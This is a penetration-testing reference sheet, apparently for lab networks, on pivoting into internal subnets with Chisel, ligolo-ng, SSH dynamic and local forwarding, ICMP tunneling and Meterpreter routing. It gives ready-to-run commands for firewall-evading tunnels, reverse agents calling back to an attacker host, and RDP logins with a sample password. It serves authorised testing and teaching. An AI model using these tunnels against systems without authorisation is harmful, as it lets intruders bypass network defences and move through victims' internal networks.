Chisel

TCP/UDP tunneling over HTTP+SSH — best for bypassing HTTP-only firewalls
Protocol
HTTP wrapped SSH
SOCKS proxy port
1080 (client side)
Needs proxychains
Yes
Binary needed on pivot
Yes — watch GLIBC version
Root required
No
OS support
Linux, Windows, macOS

✓ Use when

  • Only HTTP/HTTPS is allowed out through the firewall
  • You cannot use SSH directly to the pivot
  • You need SOCKS5 proxy for proxychains
  • Cross-platform — pivot is Windows or Linux

✗ Avoid when

  • Target has old GLIBC (use static build or rpivot instead)
  • SSH is available — SSH -D is simpler
  • You want to avoid proxychains — use ligolo-ng instead
Commands
ON PIVOT HOST (server)
ubuntu@pivot:~$ ./chisel server -v -p 1234 --socks5
ON ATTACK HOST (client)
attacker$ ./chisel client -v 10.129.x.x:1234 socks
REVERSE MODE (pivot calls back to attacker)
# On attacker:
./chisel server --reverse -v -p 1234 --socks5
# On pivot:
./chisel client -v 10.10.14.x:1234 R:socks
PROXYCHAINS CONFIG + RDP
# /etc/proxychains.conf → [ProxyList]:
socks5 127.0.0.1 1080

proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123 /cert:ignore

ligolo-ng

TLS tunnel with real tun interface — no proxychains, no GLIBC issues, best overall
Protocol
TLS (self-signed cert)
Interface created
tun (ligolo)
Needs proxychains
No — routes natively
Static binary
Yes — no GLIBC issues
Root required
Yes (ip route add)
OS support
Linux, Windows, macOS

✓ Use when

  • You want the cleanest setup — no proxychains overhead
  • You have root/sudo on your attack host
  • Target pivot has old GLIBC (static binary solves it)
  • You need to pivot into multiple subnets
  • Tools don't work well through proxychains (e.g. nmap)

✗ Avoid when

  • You don't have sudo on attack host (needs tun interface)
  • Quick single-port forward is all you need — socat is simpler
Commands
SETUP (one time on attack host)
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
START PROXY (attack host)
sudo ./proxy -selfcert -laddr 0.0.0.0:11601
RUN AGENT (on pivot)
./agent -connect 10.10.14.x:11601 -ignore-cert
LIGOLO CONSOLE → START TUNNEL
ligolo-ng » session        # select with arrow keys + Enter
[Agent: ubuntu@WEB01] » start
ADD ROUTE + RDP (no proxychains!)
sudo ip route add 172.16.5.0/24 dev ligolo
xfreerdp /v:172.16.5.19 /u:victor /p:pass@123 /cert:ignore

SSH -D (Dynamic Port Forwarding)

Built into SSH — zero extra tools, instant SOCKS5 proxy
Protocol
SSH
Proxy type
SOCKS5 on localhost
Extra tools needed
None — built into SSH
Needs proxychains
Yes
SSH required on pivot
Yes
OS support
Linux, macOS, Windows (OpenSSH)

✓ Use when

  • You have SSH access — fastest possible setup, literally one command
  • Cannot transfer any binaries to the pivot
  • Quick one-off pivot without installing anything
Commands
START DYNAMIC FORWARD (background)
ssh -D 1080 -f -N ubuntu@10.129.x.x
# -D 1080 = SOCKS proxy on localhost:1080
# -f      = go to background
# -N      = don't execute remote command
PROXYCHAINS CONFIG + RDP
# /etc/proxychains.conf:
socks5 127.0.0.1 1080

proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123 /cert:ignore
LOCAL PORT FORWARD (single port)
ssh -L 3389:172.16.5.19:3389 ubuntu@10.129.x.x -N
# Then RDP directly to localhost:3389
xfreerdp /v:127.0.0.1 /u:victor /p:pass@123 /cert:ignore

ICMP Tunneling

Hides traffic in ping packets — last resort when only ICMP is allowed
Protocol
ICMP (ping packets)
Tools
ptunnel-ng, icmpsh
Root required
Yes (raw sockets)
Speed
Very slow
Detection risk
High (unusual ICMP)
Use case
Last resort only

✓ Use when

  • Absolutely nothing else works — ICMP is the only allowed protocol
  • Firewall blocks all TCP/UDP but allows ping

✗ Avoid when

  • Any other option exists — ICMP is slow, noisy, and detectable
  • You don't have root on both ends
Commands (ptunnel-ng)
SERVER (on pivot)
sudo ptunnel-ng
CLIENT (on attack host)
sudo ptunnel-ng -p 10.129.x.x -l 2222 -r 10.129.x.x -R 22
# Then SSH through the ICMP tunnel:
ssh -p 2222 -D 1080 ubuntu@127.0.0.1

Meterpreter Pivoting

All-in-one Metasploit pivoting — route, portfwd, and socks_proxy modules
Framework
Metasploit
Proxy type
SOCKS5 (socks_proxy module)
Extra tools
None beyond Metasploit
Needs proxychains
Yes (for non-MSF tools)
OS support
Any Meterpreter session
Root required
No

✓ Use when

  • You already have a Meterpreter session — stay in the framework
  • You want to use Metasploit modules against internal targets
  • Need a quick port forward without extra tools
Commands
METHOD 1 — route + socks_proxy (full SOCKS)
# In meterpreter session:
meterpreter » run post/multi/manage/autoroute SUBNET=172.16.5.0/24

# In msf console:
msf6 » use auxiliary/server/socks_proxy
msf6 » set SRVPORT 1080
msf6 » set VERSION 5
msf6 » run -j

# proxychains.conf: socks5 127.0.0.1 1080
proxychains xfreerdp /v:172.16.5.19 /u:victor /cert:ignore
METHOD 2 — portfwd (single port)
# Forward local 3389 → internal 172.16.5.19:3389
meterpreter » portfwd add -l 3389 -p 3389 -r 172.16.5.19
xfreerdp /v:127.0.0.1 /u:victor /p:pass@123 /cert:ignore
